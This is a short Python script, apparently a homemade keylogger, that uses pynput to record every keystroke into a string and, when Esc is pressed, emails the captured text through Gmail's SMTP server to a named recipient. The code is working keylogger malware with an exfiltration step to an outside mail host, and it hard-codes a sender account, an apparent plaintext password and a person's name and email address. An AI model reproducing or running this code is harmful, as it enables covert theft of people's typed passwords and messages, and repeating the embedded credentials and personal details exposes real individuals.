from pynput import keyboard
import smtplib,ssl,time
def on_press(key):
    try:
        print('{0}'.format(key))
    except AttributeError:
        print('{0}'.format(
            key))
a='start'

def on_release(key):
    
    if key == keyboard.Key.esc:
        print(globals()['a'])
        mail(serve,sender,passw,reciever,globals()['a'])
        return False
    else:
        globals()['a']=globals()['a']+format(key)
          
 
      
    
def mail(serve,sender,passw,reciever,message):
    print(serve)
    with smtplib.SMTP(serve,587) as smt:
        smt.starttls()
        smt.ehlo()
        smt.login(sender,passw)
        smt.sendmail(sender,reciever,message)
serve="smtp.gmail.com"
sender="skilltest1101@gmail.com"
passw="lrtmein_1596"
reciever="vishnuchttrj@gmail.com"#vishnu shankar chatterjee


# Collect events until released
with keyboard.Listener(
        on_press=on_press,
        on_release=on_release) as listener:
    listener.join()

# ...or, in a non-blocking fashion:
listener = keyboard.Listener(
    on_press=on_press,
    on_release=on_release)
listener.start()